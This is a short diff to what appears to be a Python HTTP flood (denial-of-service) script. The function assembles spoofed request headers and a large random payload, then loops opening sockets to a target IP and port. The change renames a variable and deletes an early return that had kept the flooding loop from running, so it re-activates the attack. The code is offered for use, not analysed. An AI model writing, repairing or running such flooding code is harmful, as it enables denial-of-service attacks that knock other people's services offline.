@@ -159,7 +159,7 @@ def start2():
 def start():
   global useragents, acceptall, ref, socks5
   time.sleep(0.01)
-  data2 = random._urandom(75006)
+  hh = random._urandom(75006)
   xx = int(0)
   userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
@@ -169,7 +169,6 @@ def start():
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
   main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
-  return data2
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
